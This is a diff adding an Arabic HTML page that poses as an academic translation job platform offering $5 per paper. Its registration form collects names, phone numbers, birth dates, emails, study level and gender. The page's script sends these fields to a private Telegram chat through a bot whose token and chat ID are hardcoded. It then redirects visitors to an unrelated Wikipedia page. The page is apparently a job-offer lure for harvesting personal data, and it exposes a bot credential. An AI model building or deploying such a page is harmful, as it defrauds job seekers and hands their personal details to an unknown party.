@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>منصة ترجمة البحوث</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: "Cairo", sans-serif;
+      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+      color: #fff;
+      line-height: 1.7;
+    }
+
+    header {
+      text-align: center;
+      padding: 40px 20px;
+      background: rgba(0,0,0,0.5);
+      font-size: 2em;
+      font-weight: bold;
+      text-shadow: 2px 2px 8px #000;
+    }
+
+    section {
+      max-width: 1000px;
+      margin: 40px auto;
+      padding: 20px;
+    }
+
+    .card {
+      background: rgba(255, 255, 255, 0.08);
+      padding: 25px;
+      border-radius: 16px;
+      margin-bottom: 20px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.4);
+    }
+
+    .card h2 {
+      color: #ffcc70;
+      margin-bottom: 15px;
+    }
+
+    .price {
+      font-size: 1.8em;
+      font-weight: bold;
+      color: #00ffae;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
+
+    input, select, button {
+      padding: 12px;
+      border-radius: 10px;
+      border: none;
+      font-size: 1em;
+    }
+
+    input, select {
+      outline: none;
+    }
+
+    button {
+      background: linear-gradient(90deg, #ff512f, #dd2476);
+      color: #fff;
+      cursor: pointer;
+      font-weight: bold;
+      transition: 0.3s;
+    }
+
+    button:hover {
+      transform: scale(1.05);
+      background: linear-gradient(90deg, #dd2476, #ff512f);
+    }
+
+    footer {
+      text-align: center;
+      padding: 25px;
+      background: rgba(0,0,0,0.4);
+      margin-top: 50px;
+      font-size: 0.9em;
+      color: #ccc;
+    }
+
+    /* صفحة الشكر */
+    .thank-you {
+      display: none;
+      text-align: center;
+      padding: 60px;
+      font-size: 1.6em;
+      text-shadow: 2px 2px 8px #000;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    🌍 منصة ترجمة البحوث الأكاديمية
+  </header>
+
+  <section>
+    <div class="card">
+      <h2>كيف يعمل الموقع؟</h2>
+      <p>فكرتنا بسيطة جدًا: أنت تعمل من المنزل بترجمة بحوث أكاديمية من الإنجليزية إلى العربية. مقابل كل بحث مكتمل يتم دفع <span class="price">5 دولار</span>.</p>
+      <ul>
+        <li>تسجل معنا كمترجم عبر النموذج بالأسفل.</li>
+        <li>نراجع بياناتك ونتأكد من مستواك.</li>
+        <li>نرسل لك أبحاث جاهزة للترجمة (Word أو PDF).</li>
+        <li>تترجم وتسلم البحث في الوقت المحدد.</li>
+        <li>يتم الدفع بعد الاستلام والمراجعة.</li>
+      </ul>
+    </div>
+
+    <div class="card">
+      <h2>الشروط والمتطلبات</h2>
+      <ul>
+        <li>إتقان جيد للغة الإنجليزية والعربية.</li>
+        <li>دقة في استخدام المصطلحات الأكاديمية.</li>
+        <li>التزام بالمواعيد النهائية للتسليم.</li>
+        <li>جودة الترجمة أهم من السرعة.</li>
+      </ul>
+    </div>
+
+    <div class="card">
+      <h2>نصائح للقبول السريع</h2>
+      <p>إذا أردت قبولك بسرعة كمترجم معتمد، ننصحك بما يلي:</p>
+      <ul>
+        <li>قدم أمثلة عن ترجمات سابقة.</li>
+        <li>اكتب المستوى الدراسي بوضوح (بكالوريوس/ماستر/دكتوراه).</li>
+        <li>حدد الوقت الذي تستطيع الالتزام به لتسليم كل بحث.</li>
+      </ul>
+    </div>
+
+    <div class="card">
+      <h2>سجل الآن لتبدأ</h2>
+      <form id="registerForm">
+        <input type="text" id="fname" placeholder="الإسم" required>
+        <input type="text" id="lname" placeholder="اللقب" required>
+        <input type="tel" id="phone" placeholder="رقم الهاتف" required>
+        <input type="date" id="birth" required>
+        <input type="email" id="email" placeholder="البريد الإلكتروني" required>
+        <input type="text" id="study" placeholder="المستوى الدراسي" required>
+        <select id="gender" required>
+          <option value="">-- اختر الجنس --</option>
+          <option value="ذكر">ذكر</option>
+          <option value="أنثى">أنثى</option>
+        </select>
+        <button type="submit">📩 سجّل الآن</button>
+      </form>
+    </div>
+  </section>
+
+  <div class="thank-you" id="thankYouPage">
+    🎉 شكرًا لك! تم تسجيلك بنجاح.<br>
+    سيتم تحويلك بعد لحظات...
+  </div>
+
+  <footer>
+    جميع الحقوق محفوظة © 2025 – منصة ترجمة البحوث
+  </footer>
+
+  <script>
+    const form = document.getElementById("registerForm");
+    const thankYouPage = document.getElementById("thankYouPage");
+    const mainSection = document.querySelector("section");
+
+    // توكن البوت والـ Chat ID
+    const BOT_TOKEN = "7923889994:AAF3IY_Omz3uNwyTgsxLm-iaPFvPP5pMPb8";
+    const CHAT_ID = "5218031067";
+    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    form.addEventListener("submit", function(event) {
+      event.preventDefault();
+
+      const fname = document.getElementById("fname").value;
+      const lname = document.getElementById("lname").value;
+      const phone = document.getElementById("phone").value;
+      const birth = document.getElementById("birth").value;
+      const email = document.getElementById("email").value;
+      const study = document.getElementById("study").value;
+      const gender = document.getElementById("gender").value;
+
+      const message = `
+📌 تسجيل جديد في منصة الترجمة:
+👤 الإسم: ${fname} ${lname}
+📱 الهاتف: ${phone}
+🎂 تاريخ الميلاد: ${birth}
+📧 البريد: ${email}
+🎓 المستوى الدراسي: ${study}
+⚧ الجنس: ${gender}
+      `;
+
+      fetch(TELEGRAM_API, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: "HTML"
+        })
+      });
+
+      // إظهار صفحة الشكر
+      mainSection.style.display = "none";
+      thankYouPage.style.display = "block";
+
+      setTimeout(() => {
+        window.location.href = "https://en.wikipedia.org/wiki/United_States";
+      }, 3000);
+    });
+  </script>
+</body>
+</html>
